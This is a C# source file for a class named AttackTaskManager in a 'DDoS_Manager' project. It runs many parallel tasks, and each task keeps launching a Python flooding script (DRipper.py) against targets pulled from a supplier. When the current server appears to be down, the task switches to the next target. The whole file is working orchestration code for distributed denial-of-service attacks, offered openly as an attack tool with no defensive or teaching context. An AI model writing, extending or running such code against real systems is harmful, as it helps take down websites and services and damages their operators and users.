using System.Diagnostics;

namespace DDoS_Manager;

public class AttackTaskManager
{
    private readonly int _maxTasksNumber;
    private readonly Task[] _tasks;
    private readonly TargetSupplier _targetSupplier;
    private readonly HashSet<Process> _activeProcesses;
    private readonly Mutex _mutex;

    public AttackTaskManager(int maxTasksNumber, TargetSupplier targetSupplier)
    {
        _maxTasksNumber = maxTasksNumber;
        _tasks = new Task[_maxTasksNumber];
        _targetSupplier = targetSupplier;
        _activeProcesses = new HashSet<Process>();
        _mutex = new Mutex();
    }

    public void InitializeAttack()
    {
        for (var i = 0; i < _maxTasksNumber; i++)
        {
            _tasks[i] = new Task(AttackMethod);
            _tasks[i].Start();
        }
        
        for (var i = 0; i < _maxTasksNumber; i++)
        {
            _tasks[i].Wait();
        }
    }
    
    private void AttackMethod()
    {
        while (true)
        {
            var externalProcess = new Process();
            _activeProcesses.Add(externalProcess);
            externalProcess.StartInfo.FileName = "python3";
            externalProcess.StartInfo.WorkingDirectory = "resources";
            externalProcess.StartInfo.RedirectStandardOutput = true;
            _mutex.WaitOne();
            externalProcess.StartInfo.Arguments = "DRipper.py -s " + _targetSupplier.GetNextTarget();
            _mutex.ReleaseMutex();
            externalProcess.Start();

            while (true)
            {
                var line = externalProcess.StandardOutput.ReadLine();
                if (line == null)
                {
                    Thread.Sleep(1000);
                    continue;
                }

                if (!line.Contains("rippering"))
                {
                    Console.WriteLine(line);
                }
                if (!line.Contains("check server ip and port") 
                    && !line.Contains("no connection! web server maybe down!"))
                {
                    continue;
                }
                
                Console.WriteLine("Changing targets...");
                externalProcess.Kill();
                _activeProcesses.Remove(externalProcess);
                externalProcess.Close();
                break;
            }
        }
    }

    public void TerminateAttack()
    {
        foreach (var process in _activeProcesses)
        {
            process.Kill();
            process.Close();
        }
    }
}